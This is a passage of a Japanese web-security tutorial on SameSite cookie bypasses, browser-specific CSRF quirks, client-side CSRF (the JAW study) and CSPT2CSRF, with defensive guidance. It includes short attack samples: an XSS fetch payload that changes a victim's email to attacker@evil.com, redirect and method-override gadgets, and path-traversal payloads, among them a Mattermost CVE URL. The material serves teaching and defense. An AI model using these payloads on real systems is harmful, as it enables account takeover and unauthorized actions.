- SameSite / `Sec-Fetch-Site` に「唯一の防御」として依存せず、状態変更には**独立した CSRF トークン**を必須化する。ブラウザ実装バグでヘッダ系の防御が丸ごと外れうる、という事実がこの多層防御の重要性を示している。

> 出典: The Daily Swig — Chromium bug allowed SameSite cookie bypass on Android devices — https://portswigger.net/daily-swig/chromium-bug-allowed-samesite-cookie-bypass-on-android-devices
> 出典（補完）: Mozilla Bugzilla, CVE-2022-45413 — https://bugzilla.mozilla.org/show_bug.cgi?id=1791201 ／ Certus Cybersecurity — How to Bypass SameSite Cookie Check on Android Browser — https://www.certuscyber.com/insights/bypass-samesite-cookie/

---

### この節のまとめ

3 つの bypass は、攻撃対象の層こそ違うが、教訓は一つに収束する。

| テクニック | 突く層 | 核心の原理 | 恒久対策 |
|---|---|---|---|
| sibling domain + CSWSH | アプリ設計（same-site の緩さ） | 兄弟サブドメインの XSS は same-site → Strict Cookie が乗る | XSS 根絶・WS の Origin/トークン検証・信頼境界でドメイン分離 |
| Method Override | フレームワーク仕様 | GET と判定させて POST 処理を実行させる判定不一致 | メソッド非依存の CSRF トークン・override 無効化 |
| intent スキーム（Android） | ブラウザ実装バグ | intent 経由の遷移が Strict/`Sec-Fetch-Site` をすり抜ける | ブラウザ更新・intent リダイレクト排除・独立トークン |

いずれの場合も、**SameSite Cookie は「多層防御の 1 枚」であって、それ単体を CSRF の唯一の防御にしてはならない**。sink となる XSS を潰し、Origin を厳格に検証し、メソッドに依存しない CSRF トークンを併用する。この 3 点を土台に置いてこそ、SameSite は本来の価値を発揮する。

> 本節は防御・学習目的の解説である。示したペイロードは PortSwigger のラボ環境や自身が管理する検証環境でのみ再現し、実在サービスや本番環境への無許可の検証には決して用いないこと。

## SameSite bypassの解説とクイズ

SameSite属性はCSRF対策として広く定着したが、「SameSite=Lax/Strictを設定すれば安全」という理解は誤りである。本節では、SameSite属性の仕組みそのものに内在する抜け穴（トップレベルナビゲーションの定義、TLD+1判定、ブラウザ実装ごとの猶予期間）を、実際のバイパス手法とMBSDが公開したクイズ形式の検証結果の両面から掘り下げる。

### 前提：SameSiteが「防ぐもの」と「防がないもの」

SameSite属性はCookieに付与するフラグで、値は3種類ある。

| 値 | 動作 |
|---|---|
| `None` | クロスサイトの全リクエストでCookieを送出する（`Secure`必須） |
| `Lax` | クロスサイトの**トップレベルナビゲーション**かつ**安全なHTTPメソッド（実質GET）**の場合のみCookieを送出する |
| `Strict` | クロスサイトのリクエストでは一切Cookieを送出しない |

ここで初出の用語を整理する。「トップレベルナビゲーション」とは、ブラウザのアドレスバーに表示されるURLそのものが遷移すること（`<a href>`のクリック、フォーム送信によるページ遷移、`window.location`代入など）を指す。これに対し、`fetch`/`XHR`によるバックグラウンド通信や、`<img>`・`<iframe>`のサブリソース読み込みはトップレベルナビゲーションに**該当しない**。これがLax Cookieの防御範囲を決める境界線であり、以降のバイパス手法はすべてこの境界線の曖昧さを突いている。

もう一つの重要な仕様が「サイト（site）」の判定単位である。SameSiteの同一/異なるサイトの判定は、フルオリジン（スキーム+ホスト+ポート）ではなく、**eTLD+1（実効的トップレベルドメイン+1ラベル）**、いわゆる「registrable domain」で行われる。つまり `app.example.com` と `blog.example.com` は異なるオリジンだが、SameSiteの観点では**同一サイト**として扱われる。

### バイパス手法1：サブドメイン経由のCSRF（サイト判定の粒度の粗さ）

> ⚠️ **未取得の資料**: Medium記事「Day 9: Breaking SameSite: Advanced CSRF Bypass Techniques」（Agarwaldaksh氏）は、Medium側のアクセス制限（HTTP 403 Forbidden）により本文の直接取得ができませんでした。検索エンジンのキャッシュ・要約から主要技術ポイントを収集し、以下に整理しています。正確な原文表現や完全なコード例は、下記URLからご自身で直接ご確認ください: https://medium.com/@agarwaldaksh18/day-9-breaking-samesite-advanced-csrf-bypass-techniques-590f46895cae

（以下は未取得資料の補足として、検索結果で得られた要点と一般知識に基づく解説です）

同記事が指摘する1点目は、SameSiteの判定単位がeTLD+1であることを悪用したCSRFである。標的アプリが`app.example.com`にあり、Cookieに`SameSite=Lax`（または`Strict`）が設定されていても、兄弟サブドメインである`blog.example.com`側にXSS（クロスサイトスクリプティング、攻撃者が注入したスクリプトがそのオリジンの文脈で実行されてしまう脆弱性）が存在すれば、そのXSSから発行するリクエストは「同一サイト」の内部通信として扱われ、`SameSite=Strict`であってもCookieが付与される。

```html
<!-- blog.example.com 上のXSSペイロード例（防御目的の解説であり、実運用サービスへの適用を意図しない） -->
<script>
  fetch("https://app.example.com/api/change-email", {
    method: "POST",
    credentials: "include", // 同一サイトなのでSameSite=Strictでも送出される
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: "attacker@evil.com" })
  });
</script>
```

**なぜ成立するのか**: ブラウザのCookie送出判定は「リクエスト元のサイト」と「Cookieの発行元サイト」がeTLD+1単位で一致するかどうかだけを見る。ポート番号やサブドメインのラベルまでは区別しない。したがって、SameSite属性は「サードパーティサイトからの越境リクエスト」への防御であり、「同一組織が管理する別サブドメインの脆弱性」への防御にはならない。これはCSRF対策としてのSameSiteの限界であり、根本的にはサブドメイン全体のセキュリティ衛生（XSS対策、Cookieのスコープを`Domain`属性で広げすぎないこと）に依存する。

### バイパス手法2：クライアントサイドリダイレクト・ガジェット

2点目の指摘は、`SameSite=Strict`環境下でも、アプリケーション自身が持つ「クライアントサイドリダイレクトガジェット」を悪用できるというものである。ここでいうガジェットとは、攻撃者が直接コードを書き換えられないが、既存の正規機能を部品として悪用できる箇所を指す。

典型例は、URLパラメータの値をそのまま`window.location`に代入するようなリダイレクト実装である。

```html
<!-- 標的サイトが持つ正規機能（例）: https://app.example.com/redirect?to=... -->
<script>
  // アプリ内スクリプトが以下のようなコードを持つ場合
  var target = new URLSearchParams(location.search).get("to");
  window.location = target; // Open Redirect / gadget
</script>
```

攻撃者は外部サイトから被害者を`https://app.example.com/redirect?to=https://app.example.com/api/transfer?amount=1000...`のようなURLへ**トップレベルナビゲーション**させる。この時点でのナビゲーションはevil.comからapp.example.comへのクロスサイト遷移であり、Lax Cookieであれば（安全メソッド=GETである限り）Cookieが送出される。ページ内のJavaScriptが`location`を用いて次のURLへ「その場で」遷移すると、ブラウザにとってこれは**HTTPレベルの3xxリダイレクトではなく、同一ページ内の新規ナビゲーション（またはfetch）として再評価される**。結果として、最終的な同一サイト宛のリクエストは「app.example.com自身が起点になった同一サイトのリクエスト」として扱われ、`SameSite=Strict`であってもCookieが付与されてしまう。

**なぜそうなるのか（仕組みレベル）**: SameSiteの判定は「リクエストがどのサイトの文脈から発行されたか」に基づく。HTTPの302リダイレクトはブラウザが自動的に後続リクエストを生成するため、ブラウザは「元のクロスサイト起点」を記憶し続け、リダイレクト先へのリクエストにもその起点の情報が引き継がれる（これがWeb Security Academyで知られる「SameSite Strict bypass via client-side redirect」や「method override」パターンの根本原理でもある）。しかし、JavaScriptによる`location`代入は仕様上サーバー側のHTTPリダイレクトとは異なり、**新たな独立したナビゲーションイベント**としてブラウザに認識される場合がある。この新しいナビゲーションの起点は「現在のページ（app.example.com）」自身であるため、次のリクエストはブラウザから見て「同一サイトから発行された同一サイトへのリクエスト」となり、クロスサイトの文脈情報が失われる。これにより、本来クロスサイトオリジンだったはずの攻撃連鎖が、SameSite判定をすり抜けてしまう。

同様の原理で、フレームワークが提供する「HTTPメソッドオーバーライド」機能（例: `_method=DELETE`のような隠しフィールドでPOSTをPUT/DELETEとして扱う実装）も悪用対象になり得る。攻撃者がSameSite=Laxで許容されるGETのトップレベルナビゲーションを使い、サーバー側でメソッドオーバーライドにより状態変更処理（本来POST/DELETEでしか呼ばれないはずのエンドポイント）を起動させる、という構造である。

```html
<!-- Lax Cookieが送出されるGETナビゲーションを使い、
     サーバー側のメソッドオーバーライド機能でPOST相当の処理を起動させる例 -->
<a href="https://victim.example.com/account/delete?_method=DELETE">クリックしてください</a>
```

**防御の要点**: (1) リダイレクト先URLを固定のホワイトリストで検証し、任意の外部/内部パス遷移を許可しない、(2) 状態変更エンドポイントはメソッドオーバーライドの対象から除外するか、そもそもメソッドオーバーライド機能自体を無効化する、(3) SameSite属性を「唯一の防御」とせず、後述のCSRFトークン検証と併用する。

### バイパス手法3：ブラウザ実装依存の猶予期間（Chromeの「Lax by default」2分ルール）

3点目は、ブラウザベンダーが独自に導入した互換性維持のための「猶予措置」に起因するものである。Chromeは2020年2月（Chrome 80以降の段階的導入）から、`SameSite`属性を明示的に指定していないCookieを`SameSite=Lax`として扱う「Lax by default」を導入した。既存アプリの互換性を壊さないための緩和策として、Chromeは**発行から2分以内のCookieに限り、POSTを含むトップレベルナビゲーションに対してもSameSite=None相当（すなわちクロスサイトでも送出される）として扱う**という一時的な例外を設けている。

この2分間の猶予はMBSDのクイズ記事でも実測・言及されており、後述する第1問の解説と直結する。

### MBSDクイズ記事の解説：ブラウザ横断の実測比較

> 出典: 「CSRF、この罠いける？いけない？」クイズ — https://www.mbsd.jp/research/20250414/csrf/

この記事は、CSRFがCookieベースのセッション管理において「サイト横断でCookieが送出されるか」に帰着する問題であることを前提に、Chrome・Firefoxの挙動差をクイズ形式で実測した。まず基礎となるSameSite別のCookie送出可否をリクエスト手段ごとに整理した表が示されている。

| 攻撃に使う手段 | `None` | `Lax` | `Strict` |
|---|---|---|---|
| `<a href>`によるページ遷移 | 送出 | 送出 | 送出しない |
| `<form method="GET">` | 送出 | 送出 | 送出しない |
| `<form method="POST">` | 送出 | 送出しない | 送出しない |
| `XHR`/`fetch` | 送出 | 送出しない | 送出しない |
| `<img src>` | 送出 | 送出しない | 送出しない |

この基本表を踏まえた上で、記事は5問のクイズを通じて「教科書通りの表では説明できない例外」を提示している。

#### 第1問：POST + `<form>`

正解はChromeが「△（条件付きで成功）」、Firefoxが「○（成功）」である。

**解説**: Chromeの「Lax by default」機構は、`SameSite`未指定のCookieを発行直後の**2分間だけ**`None`相当として扱い、以降は`Lax`に切り替える。この2分間の間に被害者を罠のPOSTフォームに誘導できれば、本来`Lax`ならブロックされるはずのPOSTリクエストでもCookieが送出され、CSRFが成立する。攻撃者にとっては「被害者がログイン（＝セッションCookie発行）した直後の2分間」という極めて限定された時間枠を突く必要があるため、実際の攻撃難度は高いが、理論上のバイパス経路として無視できない。Firefoxはこの「Lax by default」を採用していない（明示的に`SameSite`を指定しないCookieはFirefoxでは異なる既定値・移行状況にある）ため、常に成功する。

#### 第2問：POST + XHR

ChromeもFirefoxも失敗（○ではなく❌）となる。

**解説**: 前述のChromeの2分間猶予は「トップレベルナビゲーション」に限定された例外であり、XHR/fetchのようなバックグラウンド通信には適用されない。つまり「2分ルールがあるからXHRでも何でも通る」という誤解は誤りで、猶予措置はあくまでページ遷移を伴う攻撃ベクトルにのみ効く。またFirefoxの「Total Cookie Protection（強化型トラッキング防止の一部で、サイトごとに独立したCookie Jar＝Cookie保管領域を割り当てる仕組み）」により、サードパーティコンテキストでのCookie送出自体が構造的に遮断されるため、XHRによるクロスサイトCookie送出は成立しない。

#### 第3問：GET + `<form>`

ChromeもFirefoxも成功（○）となる。

**解説**: `<form method="GET">`によるトップレベルナビゲーションは、`SameSite=Lax`の許容範囲そのものである。ここで記事が強調するのは、GETメソッドはRFC 9110（HTTPセマンティクス）において「安全（safe）」かつ「べき等（idempotent、同じリクエストを何度実行しても状態が変化しない）」なメソッドと定義されている点である。すなわち、サーバーの状態を変更する処理（送金、パスワード変更、削除など）をGETリクエストで実装すること自体が設計上の誤りであり、この場合はブラウザ側の防御機構（SameSite）が正しく機能していても意味をなさない。これはSameSiteのバイパスというより、そもそもSameSiteの防御対象外の設計ミスである、という教訓を示す設問である。

#### 第4問：GET + 複数のリクエスト手段（投機的読み込みを含む）

Chromeは「`<link>`によるprerender（投機的にページ全体を事前レンダリングする機能）」のパターンのみ成功し、他は失敗。Firefoxは全パターン失敗となる。

**解説**: prerenderは、ユーザーが実際にリンクをクリックする前に、ブラウザが裏側で遷移先ページを先読み・事前レンダリングしておく最適化機能である。事前レンダリングの時点で遷移先の完全なページ（Cookieを要するリクエストを含む）を構築する必要があるため、ブラウザの実装上、これは実質的に「トップレベルナビゲーション相当」の文脈として扱われ、Lax Cookieが送出される。つまり、ユーザーが実際にクリックする前の段階で既にサーバー側の処理（GETベースの状態変更等）が走ってしまう可能性がある。ただし記事も指摘する通り、prerenderを用いた投機的読み込み自体は仕様変更が続く発展途上の機能であり、Firefox・Safariは本稿執筆時点で同等機能を実装していない。ブラウザ間の実装差が大きい領域であるため、読者は自身の対象読者ブラウザの現行仕様を都度確認する必要がある。

#### 第5問：POST + XHR + `window.open`

Chromeは失敗、Firefoxは成功という、直感に反する結果になる。

**解説**: この設問の核心はFirefoxの「Opener Heuristics（開設者ヒューリスティック）」である。これは、ユーザーの明示的なクリック操作を起点に第三者サイトが新しいタブやポップアップウィンドウとして開かれた場合、Firefoxがその開かれた側のサイトに対して**30日間**のストレージアクセス許可（Total Cookie Protectionの例外扱い）を暗黙に付与する仕組みである。狙いは、OAuth連携やSSO（シングルサインオン）のポップアップフローのようなユーザーの意図した正規のクロスサイト連携を壊さないための互換性維持措置である。しかしこの例外により、一度でも「ユーザー操作起点でポップアップを開かれた」サイトの組み合わせでは、その後30日間、XHRを含むバックグラウンド通信でもクロスサイトCookieが送出され得る状態になる。攻撃者は事前にポップアップを開かせる別の口実（例えば正規に見えるボタン）を用意し、後続の攻撃ページでこの猶予期間を悪用する、という二段階の攻撃シナリオが成立し得る。Chromeにはこの種のヒューリスティックによる猶予措置がないため、通常のLax/Strictポリシー通りに失敗する。

### 各バイパス手法から導かれる防御指針

MBSDクイズとMedium記事の両方が収斂する結論は共通している。

1. **GETによる状態変更を絶対に実装しない**: RFC 9110が定めるHTTPメソッドの意味論（安全性・べき等性）を守ること自体が、SameSite以前の大前提の防御になる。
2. **SameSite属性を唯一の防御と見なさない**: Chromeの2分間猶予、prerenderの扱い、Firefoxのopener heuristicsのような「ブラウザベンダー固有の互換性維持のための例外」は年々仕様変更されるため、SameSiteだけに依存した設計は将来のブラウザアップデートで突然壊れる（＝防御が弱まる、あるいは逆に正規機能が壊れる）リスクを抱える。
3. **CSRFトークンによるサーバー側検証を併用する**: SameSite属性はあくまでブラウザ側の一次防御であり、リクエストの正当性をサーバー側で暗号論的に検証するトークン方式（Synchronizer Token PatternやDouble Submit Cookie等）と多層防御を組むことが望ましい。
4. **サブドメインとリダイレクト機能の棚卸し**: eTLD+1単位の判定という仕様上の粗さを踏まえ、同一組織配下の全サブドメインのXSS対策、およびアプリケーション内のオープンリダイレクト/クライアントサイドリダイレクトガジェットの有無を定期的に点検する。
5. **ブラウザ実装差を前提にした設計**: 対象ユーザー層が利用するブラウザ（Chrome、Firefox、Safari等）ごとにSameSite関連仕様のバージョン依存の挙動が異なることを踏まえ、単一ブラウザでの検証結果を全体の安全性の根拠にしない。

### まとめ

SameSite属性はCSRF対策の重要な一層だが、(a) トップレベルナビゲーションの定義の曖昧さを突くクライアントサイドリダイレクトやメソッドオーバーライド、(b) eTLD+1という粗い同一サイト判定を突くサブドメイン経由の攻撃、(c) 各ブラウザが互換性維持のために独自導入した時限的な例外措置（Chromeの2分ルール、Firefoxの30日opener heuristics）という3系統の抜け道が存在する。これらはいずれも「ブラウザの仕様のグレーゾーン」であり、ベンダーのアップデートで挙動が変わり得る。したがって防御側は、SameSite属性の正しい設定に加え、GETの安全性を守る設計、サーバー側のCSRFトークン検証、リダイレクト機能のホワイトリスト化という多層防御を組み合わせることが不可欠である。

## client-side CSRF（学術研究→実務）

### この節のねらい

古典的な CSRF（Cross-Site Request Forgery）は「サーバが受け取ったリクエストの出所を検証していない」ことを突く攻撃だった。攻撃者は `<form>` や `<img>` を仕込んだ罠ページを用意し、被害者のブラウザに勝手にリクエストを送らせる。これに対して防御側は CSRF トークン・`SameSite` Cookie・Origin/Referer 検証といった対策を積み上げてきた。第4章のここまでで見たとおり、`SameSite=Lax` の普及によって「クロスサイトの `<form>` から勝手に POST される」古典的 CSRF は大きく封じられた。

しかし「CSRF は死んだ」わけではない。攻撃の起点が**サーバ側からクライアント側（ブラウザ内で動く JavaScript）へ移動した**のである。本節では、この潮流を代表する 2 つのテーマを扱う。

- **client-side CSRF（クライアントサイド CSRF）**: ページ内の JavaScript が、攻撃者の操作できる入力（URL のフラグメントや `postMessage` など）をもとに HTTP リクエストを組み立ててしまう脆弱性。学術研究 **JAW**（USENIX Security 2021）がこの問題を体系化した。
- **CSPT2CSRF（Client-Side Path Traversal → CSRF）**: フロントエンドが組み立てる API リクエストの**パス**に攻撃者入力が素通りし、`../` によって別のエンドポイントへ「再ルーティング」される脆弱性。Doyensec が 2024 年に「CSRF is dead, long live CSRF」というスローガンとともに実務向けに再定義した。

どちらも共通しているのは、「リクエストを実際に送るのはページ自身の正規コード（`fetch`/`XMLHttpRequest` 等）である」点だ。だからこそ Cookie は自動付与され、`SameSite` はページと同一サイト扱いになり、CSRF トークンさえ正規コードが勝手に付けてくれることすらある。従来対策の前提を根こそぎ崩すのがこの新潮流である。

---

### client-side CSRF とは何か（JAW の定義）

**client-side CSRF** とは、ページ内で動く JavaScript プログラムが、攻撃者が制御できる入力を使って、認証済みの HTTP リクエストを生成・送信してしまう脆弱性である。古典的 CSRF が「攻撃者のページが直接リクエストを作る」のに対し、client-side CSRF では「被害者ページの正規 JS を騙して、意図しないリクエストを作らせる」。

Khodayari らの定義を、脆弱性解析の共通言語である **source（ソース）** と **sink（シンク）** で整理すると理解しやすい。

- **source（ソース）** = 攻撃者が値を注入できる入力元。ここでは「攻撃者が制御可能なデータの入口」を指す。JAW が追跡する主なソースは次のとおり。
  - `window.location`（`href` / `pathname` / `search` / `hash`）—— とくに **URL フラグメント（`#` 以降）** はサーバに送られずブラウザ内だけで処理されるため、罠 URL を踏ませるだけで JS に値を渡せる典型的なソース。
  - `postMessage` で受信したデータ（`event.data`）
  - `document.referrer`
  - `localStorage` / `sessionStorage`（WebStorage）
- **sink（シンク＝入力が最終的に「HTTP リクエスト送信」として実行される危険な代入先）** = リクエストを実際に発火させる API。JAW が追跡する主なシンクは次のとおり。
  - `fetch()`
  - `XMLHttpRequest`（`open()`/`send()`）
  - `window.open()`
  - jQuery の `$.ajax()`
  - フォーム送信（`form.submit()`）

ソースからシンクまで攻撃者データが**データフロー上つながっている**とき、そのリクエストは攻撃者が細工できる＝ **forgeable request（偽造可能リクエスト）** となる。

#### なぜ危険なのか（原理）

このリクエストを送るのは被害者ページ自身の正規コードなので、次が同時に成立する。

1. **Cookie が自動的に付く**（同一オリジンへのリクエスト）。認証セッションが乗る。
2. **`SameSite` は無力**。攻撃者ページから直接送るのではなく、被害者が正規サイトを開いた状態の中で JS が送るため、リクエストはファーストパーティ（同一サイト）扱いになる。`SameSite=Lax`/`Strict` でも Cookie は付く。
3. **CSRF トークンさえ回避されうる**。正規のリクエスト生成コードがトークンをヘッダやボディに自動付与する実装であれば、攻撃者がパラメータだけ差し替えても有効なトークンが付いたまま送られてしまう。

つまり client-side CSRF は「古典的 CSRF 対策の外側」で成立する。だからこそ `SameSite` 時代の高度な CSRF として重要なのである。

具体的なコード例で見てみよう。次のようなコードは典型的な脆弱パターンだ。

```javascript
// 脆弱例: URL の一部（フラグメント）を検証せずにリクエストのパスへ流し込む
var ajaxloc = window.location.href;          // source: WIN.LOC
$.ajax({
  url: ajaxloc + "/bearer1234/",             // sink: $.ajax の url に攻撃者データが到達
  type: "POST",
  data: { action: "delete" }
});
```

被害者が `https://victim.example/#https://attacker.example` のような URL を踏むと、`ajaxloc` に攻撃者ドメインが混入し、認証付き POST の宛先や中身を攻撃者が左右できる。JAW は実際にこの形の検出結果を次のように出力する。

```
[*] Tags: ['WIN.LOC']
[*] Template: ajaxloc + "/bearer1234/"
1:['WIN.LOC'] variable=ajaxloc
    0 (loc:6)- var ajaxloc = window.location.href
```

`Tags: ['WIN.LOC']` は「このリクエストは `window.location` 経由で偽造可能」というセマンティックなタグ付けであり、`Template` はリクエスト URL がどんな文字列連結で組み立てられているか（＝攻撃者がどこを制御できるか）を示す。

> 出典: CISPA — It's all about who's asking（JAW 一般向け解説） — https://cispa.de/en/jaw

---

### JAW: 大規模解析でわかったこと（USENIX Security 2021）

**JAW** は Soheil Khodayari と Giancarlo Pellegrino（CISPA）が開発した、client-side CSRF を大規模に発見するための静的・動的ハイブリッド解析フレームワークである。論文タイトルは "JAW: Studying Client-side CSRF with Hybrid Property Graphs and Declarative Traversals"。

#### なぜ「ハイブリッド」なのか

JavaScript は動的な言語（実行時に型やコード構造が変わる、イベント駆動で呼び出し順が読みにくい、DOM やネットワークに依存する）であり、静的解析だけでは「どのソースがどのシンクに届くか」を正確に追えない。そこで JAW は次の 2 つを組み合わせる。

- **静的成分**: `esprima` パーサ（EsTree/SpiderMonkey 仕様準拠）で AST（抽象構文木）を構築し、データフロー・制御フローを解析する。
- **動的成分**: Selenium / Puppeteer / Playwright（テイント追跡付き）でページを実際にクロールし、実行時に飛んだ**ネットワークリクエスト・発火したイベント・Cookie・DOM スナップショット**を収集する。

#### Hybrid Property Graph（HPG）と宣言的トラバーサル

JAW の中核は **HPG（ハイブリッド・プロパティ・グラフ）** というデータモデルである。プログラムの AST・制御フロー・データフロー・（PDG など）意味情報に、動的に集めた実行時情報を「ノードとエッジ」として統合し、**Neo4j グラフデータベース**に格納する。

セキュリティ上の性質（「ソースからシンクへ到達可能か」等）を、解析ロジックを自作する代わりに **Cypher（Neo4j のクエリ言語）による宣言的トラバーサル（declarative traversal）** として書く。これが「declarative traversals」の意味である。JAW はこの仕組みで次を判定する。

- **データフロー解析**: プログラムスライスをたどり、変数の代入連鎖を追う
- **制御フロー解析**: 実行経路をたどる
- **到達可能性解析（reachability）**: シンクがソースから到達可能かを判定
- **パターンマッチ**: 脆弱性シグネチャに一致する部分グラフを探す

処理パイプラインはおおむね次の順序で動く。

```
1. クロール       : Selenium/Puppeteer/Playwright でページを取得（テイント追跡）
2. HPG 構築       : node engine/cli.js  → ノード/エッジの CSV を生成
3. Neo4j へインポート: python3 -m hpg_neo4j.hpg_import
4. 解析          : Python スクリプトから Cypher クエリで問い合わせ
5. 出力          : sink.flows.out に、タグ付きの脆弱性フローを書き出す
```

JAW は client-side CSRF だけでなく、**DOM Clobbering**（HTML の `id`/`name` 属性で JS のグローバル変数を上書きし、`window.x` 的な参照を攻撃者が乗っ取る手法）、**Request Hijacking**、**Open Redirect** も同じ HPG 基盤で検出できる。GitHub 版ではこれらの検出クエリが同梱されている。

#### 主要な数値と結論

論文が示したスケールと結果は次のとおり（USENIX Security 2021 時点、Bitnami カタログの Web アプリを対象）。

- 解析対象: **106 個の Web アプリケーション**、**約 2 億 2,800 万行（228M lines）の JavaScript**
- 発見: **12,701 件の偽造可能リクエスト（forgeable requests）**
- 影響: **106 個中 87 個のアプリに脆弱性**が存在
- 実証: **203 件が実際に悪用可能**、うち **7 アプリで動作する PoC** を確認、**25 種の request template（リクエスト雛形）** を特定
- 悪用能力: 古典的 CSRF では届かない経路を通じて、**サーバ側状態の任意改変・XSS・SQL インジェクション**まで到達しうる

結論として、client-side CSRF は「古典的手法の枠を超えた追加の攻撃面（additional attack vectors）を開く」ものであり、`SameSite` 等でサーバ側 CSRF を塞いでも残る、独立した脅威クラスであることが大規模データで裏づけられた。

> 出典: USENIX Security 2021 — JAW: Studying Client-side CSRF with Hybrid Property Graphs and Declarative Traversals（Khodayari & Pellegrino） — https://www.usenix.org/conference/usenixsecurity21/presentation/khodayari
>
> 出典: JAW GitHub（HPG / DOM Clobbering / open redirect / CSRF 検出クエリ） — https://github.com/SoheilKhodayari/JAW

---

### CSPT2CSRF: パスの穴から蘇る CSRF（実務の新潮流）

学術研究が体系化した client-side CSRF を、実務のバグバウンティ文脈で鋭く再定義したのが Doyensec の **CSPT2CSRF**（2024 年）である。標語は "CSRF is dead, long live CSRF"（CSRF は死んだ、CSRF 万歳）。

#### Client-Side Path Traversal（CSPT）とは

**CSPT（クライアントサイド・パストラバーサル）** とは、フロントエンドが `fetch`/`XHR` で API を叩くとき、URL の**パス部分**に攻撃者入力がエンコードされずに埋め込まれ、`../` によって別のエンドポイントへ到達してしまう脆弱性である。

原理はシンプルだ。ブラウザ（と多くのサーバ）は URL を送信・処理する前に**パス正規化（path normalization）** を行い、`a/b/../c` を `a/c` に畳み込む。したがって、パスに埋め込まれた `../` は「上のディレクトリへ戻る」ように働き、開発者が想定していないエンドポイントへリクエストが着地する。

```
本来の想定:
  画面 https://example.com/static/cms/news.html?newsitemid=123
  が   https://example.com/newitems/123  を fetch する

攻撃 (?newsitemid= に細工):
  ?newsitemid=../pricing/default.js?cb=alert(document.domain)//
  → 正規化後、/pricing/... へ再ルーティングされる
```

このリクエストを送るのはページ自身なので、**Cookie も認証トークンも自動で付く**。ここが CSRF に化ける鍵である。

#### なぜ CSPT が CSRF になるのか（source / sink モデル）

Doyensec は CSPT2CSRF を、client-side CSRF と同じく **source / sink** で記述する。ただし語義がやや実務寄りだ。

- **source（ソース）** = 被害者の代わりに HTTP リクエストを発火させる「起点となる操作」であり、攻撃者がその入力（＝パスに入る値）を制御できる箇所。ソースの現れ方には **DOM 型・Reflected（反射）型・Stored（保存）型** の 3 つがある。これは XSS の分類と同じ発想で、攻撃者データがどこ経由でパスに届くか（URL からその場で／サーバの反射応答経由／保存データ経由）を表す。
- **sink（シンク）** = 実際にリクエストを送る API 呼び出し（`fetch`/`XHR` 等）。CSPT2CSRF の場合、**再ルーティングされる先の正規 API リクエスト**がシンクにあたる。

決定的に重要なのが次の制約だ。**攻撃者が制御できるのは基本的に URL のパスだけ**である。CSPT は「既存の正規 API リクエストを別のパスへ流用する」攻撃なので、HTTP メソッド・ヘッダ・ボディは元のリクエストのものが使われ、攻撃者は原則いじれない。裏を返せば、狙える着地先エンドポイントは「元リクエストと同じメソッド・同じボディ形状で意味を持つもの」に限られる。したがって攻撃を記述するときは「どのソース（＝どの HTTP verb を発火する操作）か」を必ず特定する。同じフロントエンドでも、GET を撃つソース・POST を撃つソース・PATCH/PUT/DELETE を撃つソースは別物だからだ。

#### 古典的 CSRF に対する優位点（ここが核心）

CSPT2CSRF が「CSRF 万歳」と言われる理由は、従来の CSRF 対策を軒並みすり抜けるからである。

- **POST/PATCH/PUT/DELETE でも成立**: 古典的 CSRF が単純な `<form>` GET/POST に縛られたのに対し、CSPT は正規コードが撃つ任意メソッドのリクエストを再ルーティングできる。
- **CSRF トークンを回避**: パスだけ差し替えるため、正規コードが付与した有効なトークンがそのまま乗る。
- **`SameSite=Lax` を回避**: リクエストはページ自身（ファーストパーティ）から出るため Cookie が付く。
- **1-click 化**: 被害者に罠リンクを 1 回踏ませるだけで発火する構成が可能。
- **GET シンクの連鎖**: 状態変更できない GET シンクの CSPT2CSRF でも、別の状態変更 CSPT2CSRF と連鎖させる（ファイルのアップロード/ダウンロード機能を「ガジェット」として悪用する）ことで攻撃を成立させられる場合がある。

#### 公開されている実例（防御・修正状況の把握のため）

以下は Doyensec 等が公表した、修正済みの代表事例である（攻略手順ではなく、影響と対象バージョンの把握を目的に列挙する）。

- **Mattermost（CVE-2023-45316）**: POST シンクの悪用。次のようにパスへ `../` を仕込み、内部 API `/api/v4/caches/invalidate` へ再ルーティングされた。
  ```
  /<team>/channels/channelname?telem_action=under_control&telem_run_id=../../../../../../api/v4/caches/invalidate
  ```
  `telem_run_id` パラメータがパスに素通りしていたことが原因。
- **Rocket.Chat**: 1-click の CSPT2CSRF。
- **Grafana（CVE-2023-5123）**: JSON API Plugin での悪用。
- **Jupyter**: 複数 CVE の連鎖によるトークン漏えい。

> ⚠️ **未取得の資料**: Doyensec の原典解説「Exploiting Client-Side Path Traversal to Perform CSRF — Introducing CSPT2CSRF」および同社ホワイトペーパー「CSRF is dead, long live CSRF」は、本節では PayloadsAllTheThings 経由の内容と検索結果に基づいて要約しています。一次情報を精読したい場合は次を直接ご覧ください: https://blog.doyensec.com/2024/07/02/cspt2csrf.html ／ https://www.doyensec.com/resources/Doyensec_CSPT2CSRF_Whitepaper.pdf
>
> 出典: PayloadsAllTheThings — Client Side Path Traversal（CSPT2CSRF） — https://swisskyrepo.github.io/PayloadsAllTheThings/Client%20Side%20Path%20Traversal/

---

### 検出と防御

#### 検出（防御目的の自己診断）

- **JAW**（研究者・大規模監査向け）: HPG + Cypher で「ソース→シンク」の偽造可能フローを網羅的に洗い出す。自社アプリの JS を Neo4j に取り込み、同梱クエリで client-side CSRF・DOM Clobbering・open redirect を検査できる。
- **CSPTBurpExtension**（実務向け）: Burp Suite 拡張。クライアント制御可能なソースと、パスに到達するリクエストシンクを突き合わせて CSPT を発見する。
- **CSPTPlayground**: 手法を安全に学ぶための練習用ラボ環境。

いずれも自分が管理する（または許可を得た）対象に対してのみ用いること。実在サービスや本番環境への無許可の検証・破壊的操作は行わない。

#### 防御（設計原則）

client-side CSRF / CSPT2CSRF は「ソースからシンクへ攻撃者データが素通りする」ことが根本原因なので、対策も同じ軸で立てる。

1. **入力の出所を信用しない**: `location.hash` / `location.search` / `postMessage` の `event.data` / `document.referrer` / WebStorage は攻撃者制御下にありうる。これらをリクエスト URL に流す前に検証する。
2. **`postMessage` は必ず `origin` を検証**する。送信側も `targetOrigin` を明示する。
3. **リクエスト URL の組み立てを安全化**する。
   - パスに入れる値は `encodeURIComponent()` でエンコードし、`../` が「ディレクトリ移動」として解釈されないようにする。
   - **URL パーツを文字列連結で組まない**。`URL` オブジェクトや、ベース URL を固定したうえでのパラメータ API（`URLSearchParams`）を使い、パスの分節を安全に扱う。
   - 宛先を**許可リスト（allowlist）** で制約する。可変にするなら「識別子（数値 ID 等）」のみを受け取り、パス構造そのものを攻撃者に決めさせない。
4. **サーバ側で正規化後のパス／エンドポイントを検証**する。想定外のエンドポイントへの内部リクエストを弾く。
